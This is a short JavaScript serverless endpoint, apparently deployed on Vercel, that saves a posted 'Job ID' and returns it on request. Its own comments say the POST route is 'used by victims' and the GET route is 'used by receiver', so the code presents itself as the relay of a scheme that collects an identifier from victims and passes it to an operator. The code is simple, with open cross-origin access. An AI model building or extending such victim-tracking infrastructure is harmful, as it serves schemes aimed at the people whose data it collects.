// Vercel API endpoint - Save and retrieve Job IDs
let storedJobId = "";

export default async function handler(req, res) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // POST - Save Job ID (used by victims)
    if (req.method === 'POST') {
        const { jobId } = req.body;
        if (jobId) {
            storedJobId = jobId;
            console.log(`[SAVED] Job ID: ${jobId}`);
            return res.status(200).json({ success: true, jobId: jobId });
        }
        return res.status(400).json({ error: "No jobId provided" });
    }
    
    // GET - Retrieve Job ID (used by receiver)
    if (req.method === 'GET') {
        return res.status(200).json({ jobId: storedJobId });
    }
    
    return res.status(405).json({ error: "Method not allowed" });
}
